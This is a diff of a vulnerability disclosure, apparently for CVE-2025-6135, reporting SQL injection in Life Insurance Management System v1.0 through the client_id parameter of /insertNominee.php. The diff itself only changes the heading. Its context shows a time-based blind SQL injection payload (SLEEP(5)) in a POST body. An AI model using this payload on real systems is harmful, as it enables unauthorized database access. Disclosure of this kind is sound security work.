@@ -1,6 +1,6 @@
+# CVE-2025-6135
 
-
-#  SQLi vulnerability in Life Insurance Management System v1.0 of file /insertNominee.php with param 'client_id'
+SQLi vulnerability in Life Insurance Management System v1.0 of file /insertNominee.php with param 'client_id'
 
 **vender**:
 
@@ -58,7 +58,6 @@ Parameter: client_id (POST)
     Payload: nominee_id=3&client_id=3' AND (SELECT 8478 FROM (SELECT(SLEEP(5)))Kufl) AND 'tgPh'='tgPh&name=3&sex=3&birth_date=3&nid=3&relationship=3&priority=3&phone=3
 ---
 ```
-
 
 
 
